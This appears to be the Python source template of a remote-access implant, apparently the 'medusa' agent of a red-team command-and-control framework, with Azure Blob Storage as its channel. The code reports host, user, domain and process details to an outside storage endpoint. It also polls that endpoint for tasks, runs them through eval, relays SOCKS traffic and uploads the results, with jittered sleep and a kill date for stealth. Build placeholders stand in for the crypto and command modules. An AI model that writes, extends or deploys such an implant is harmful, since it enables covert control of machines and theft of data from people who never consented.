import os, random, sys, json, socket, base64, time, platform, ssl, getpass
import urllib.request
import uuid
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

CRYPTO_HERE

    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]:
            if k in os.environ.keys(): return os.environ[k]

    # Configuration - Stamped at build time
    blob_endpoint = "BLOB_ENDPOINT_PLACEHOLDER"
    container_name = "CONTAINER_NAME_PLACEHOLDER"
    sas_token = "CONTAINER_SAS_PLACEHOLDER"
#CERTSKIP

    def get_blob_url(self, blob_path: str) -> str:
        """Construct full blob URL with SAS token"""
        return f"{self.blob_endpoint}/{self.container_name}/{blob_path}?{self.sas_token}"

    def put_blob(self, blob_path: str, data: bytes) -> bool:
        """Upload data to a blob"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                data=data,
                method="PUT",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                    "Content-Length": str(len(data)),
                }
            )
            with urllib.request.urlopen(req) as resp:
                return resp.status in (200, 201)
        except Exception as e:
            #print(f"[!] PUT blob error: {e}")
            return False

    def delete_blob(self, blob_path: str) -> bool:
        """delete a data blob"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                method="DELETE",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                }
            )
            with urllib.request.urlopen(req) as resp:
                return resp.status in (200, 201)
        except Exception as e:
            #print(f"[!] DELETE blob error: {e}")
            return False

    def get_blob(self, blob_path: str) -> bytes:
        """Download blob data"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req) as resp:
                return resp.read()
        except urllib.request.HTTPError as e:
            if e.code == 404:
                return b""  # Blob not found
            #print(f"[!] GET blob error: {e}")
            return b""
        except Exception as e:
            #print(f"[!] GET blob error: {e}")
            return b""

    def postMessageAndRetrieveResponseBlob(self, data):
        formatted_data = self.formatMessage(data)
        message_id = uuid.uuid4()
        self.put_blob(f"ats/{message_id}.blob", formatted_data)
        response = b""
        while response == b"":
            self.agentSleep()
            response = self.get_blob(f"sta/{message_id}.blob")
            #print(f"[*] checking for sta/{message_id}.blob: {response}")
        self.delete_blob(f"sta/{message_id}.blob")
        decoded_response = base64.b64decode(response)
        return self.formatResponse(self.decrypt(decoded_response))

    def formatMessage(self, data, urlsafe=False):
        uuid_to_use = self.agent_config["UUID"]
        if uuid_to_use == "":
            uuid_to_use = self.agent_config["PayloadUUID"]
        output = base64.b64encode(uuid_to_use.encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe:
            output = base64.urlsafe_b64encode(uuid_to_use.encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        uuid_to_use = self.agent_config["UUID"]
        if uuid_to_use == "":
            uuid_to_use = self.agent_config["PayloadUUID"]
        if isinstance(data, bytes):
            decoded = data.decode()
        else:
            decoded = data
        cleaned = decoded.replace(uuid_to_use, "")
        if not cleaned or cleaned.strip() == "":
            return {}
        return json.loads(cleaned)

    def postMessageAndRetrieveResponse(self, data):
        return self.postMessageAndRetrieveResponseBlob(data)

    def getMessageAndRetrieveResponse(self, data):
        return self.postMessageAndRetrieveResponseBlob(data)

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)
        if "socks" in response_data:
            for packet in response_data["socks"]: self.socks_in.put(packet)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]:
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                                  if resp["task_id"] == t["task_id"] \
                                  and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
                if "socks" in response_data:
                    for packet in response_data["socks"]: self.socks_in.put(packet)
        except: pass

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"]
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()
        taskings = self.taskings
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        #print("[+] get tasking")
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        #print("[+] checkin")
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        response_data = self.postMessageAndRetrieveResponse(data)
        if("status" in response_data):
            UUID = response_data["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)

        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                                                                self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req) as response:
                out = base64.b64decode(response.read())
                response.close()
                return out
        except: return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_HERE

    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": HEADER_PLACEHOLDER,
            "Sleep": int("CALLBACK_INTERVAL_PLACEHOLDER"),
            "Jitter": int("CALLBACK_JITTER_PLACEHOLDER"),
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
        }

        while True:
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while True:
                    if self.passedKilldate():
                        self.exit(None)
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()

if __name__ == "__main__":
    medusa = medusa()
